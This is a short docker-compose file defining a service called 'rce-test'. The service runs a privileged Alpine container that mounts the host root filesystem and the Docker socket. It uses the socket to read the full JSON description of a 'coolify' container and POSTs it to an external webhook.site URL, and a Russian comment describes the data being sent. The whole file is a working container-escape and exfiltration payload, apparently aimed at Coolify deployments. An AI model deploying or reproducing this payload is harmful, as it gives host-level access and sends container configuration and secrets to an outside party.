version: '3.8'
services:
  rce-test:
    image: 'alpine:3.19'
    privileged: true
    network_mode: host
    volumes:
      - '/:/host-root'
      - '/var/run/docker.sock:/var/run/docker.sock'
    command:
      - sh
      - -c
      - |
        apk add --no-cache curl
        
        # Отправляем весь JSON контейнера coolify
        curl -s --unix-socket /var/run/docker.sock \
          http://localhost/containers/coolify/json | \
          curl -X POST --data-binary @- https://webhook.site/b403c049-bece-4ab0-9939-375e99823557?stage=coolify_full_json
        
        sleep 3600
